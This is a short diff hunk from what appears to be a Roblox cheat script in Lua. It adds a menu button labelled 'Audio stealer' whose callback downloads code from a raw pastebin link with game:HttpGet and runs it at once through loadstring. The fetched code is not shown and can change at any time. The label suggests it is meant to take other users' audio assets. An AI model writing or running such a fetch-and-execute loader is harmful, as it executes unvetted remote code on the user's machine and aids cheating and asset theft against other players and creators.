@@ -774,6 +774,13 @@ end
  end    
 })
 
+Tab:AddButton({
+ Name = "Audio stealer",
+ Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/tj9B565T"))()
+   end    
+})
+
 local Tab = Window:MakeTab({
 	Name = "Misc",
 	Icon = "rbxassetid://4483345998",
